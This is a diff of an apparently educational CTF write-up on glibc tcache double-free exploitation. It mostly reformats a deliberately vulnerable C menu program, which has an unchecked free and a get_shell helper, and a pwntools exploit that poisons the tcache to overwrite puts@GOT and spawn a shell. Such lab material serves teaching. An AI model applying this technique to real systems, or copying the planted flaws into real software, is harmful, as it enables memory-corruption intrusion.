@@ -95,37 +95,73 @@ check tcache -> check bins -> use top chunk
 
 ```c
 // gcc -o tcache_dup tcache_dup.c -no-pie
-#include <stdio.h>#include <stdlib.h>#include <signal.h>#include <unistd.h>char *ptr[10];void alarm_handler() {
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+char *ptr[10];
+
+void alarm_handler() {
     exit(-1);
-}void initialize() {
+}
+
+void initialize() {
     setvbuf(stdin, NULL, _IONBF, 0);
     setvbuf(stdout, NULL, _IONBF, 0);
     signal(SIGALRM, alarm_handler);
     alarm(60);
-}int create(int cnt) {
-    int size;if(cnt > 10) {
+}
+
+int create(int cnt) {
+    int size;
+
+    if (cnt > 10) {
         return -1;
     }
     printf("Size: ");
     scanf("%d", &size);
-    ptr[cnt] = malloc(size);if(!ptr[cnt]) {
+
+    ptr[cnt] = malloc(size);
+
+    if (!ptr[cnt]) {
         return -1;
-    }printf("Data: ");
+    }
+
+    printf("Data: ");
     read(0, ptr[cnt], size);
-}int delete() {
-    int idx;printf("idx: ");
-    scanf("%d", &idx);if(idx > 10) {
-        return -1;
-    }free(ptr[idx]);
-}void get_shell() {
-    system("/bin/sh");
-}int main() {
+}
+
+int delete() {
     int idx;
-    int cnt = 0;initialize();while(1) {
+
+    printf("idx: ");
+    scanf("%d", &idx);
+
+    if (idx > 10) {
+        return -1;
+    }
+
+    free(ptr[idx]);
+}
+
+void get_shell() {
+    system("/bin/sh");
+}
+
+int main() {
+    int idx;
+    int cnt = 0;
+
+    initialize();
+
+    while (1) {
         printf("1. Create\n");
         printf("2. Delete\n");
         printf("> ");
-        scanf("%d", &idx);switch(idx) {
+        scanf("%d", &idx);
+
+        switch (idx) {
             case 1:
                 create(cnt);
                 cnt++;
@@ -136,8 +172,11 @@ check tcache -> check bins -> use top chunk
             default:
                 break;
         }
-    }return 0;
+    }
+
+    return 0;
 }
+
 ```
 
 - You can allocate chunks of any size you want through 1.
@@ -202,25 +241,47 @@ tcache_bins[0x20]:
 ``` 
 ## EXPLOIT CODE 
 ```python
+#!/usr/bin/python3
 from pwn import *
-p = process('./tcache_dup')
-e = ELF("./tcache_dup")
-libc = ELF("./libc-2.27.so", checksec=False)
+
+p = process("./tcache_dup_patched")
+
+e = ELF("./tcache_dup_patched")
+
+
 get_shell = e.symbols['get_shell']
-puts_got = e.got['puts']def slog(symbol, addr):
-    return success(symbol + ": " + hex(addr))def create(size, data):
+puts_got = e.got['puts']
+
+
+def slog(symbol, addr):
+    return success(symbol + ": " + hex(addr))
+
+
+def create(size, data):
     p.sendlineafter("> ", "1")
     p.sendlineafter("Size: ", str(size))
-    p.sendafter("Data: ", data)def delete(idx):
+    p.sendafter("Data: ", data)
+
+
+def delete(idx):
     p.sendlineafter("> ", "2")
-    p.sendlineafter("idx: ", str(idx))# Double Free
-create(0x10, "zwxbj")
+    p.sendlineafter("idx: ", str(idx))
+
+
+# Double Free
+create(0x10, "dreamhack")
 delete(0)
-delete(0) # Overwrite puts@got -> get_shell
+delete(0)
+
+
+# Overwrite puts@got -> get_shell
 create(0x10, p64(puts_got))
 create(0x10, 'A'*8)
 create(0x10, p64(get_shell))
+
 p.interactive()
+
+
 ```
 
 - We allocate a single chunk (index 0).
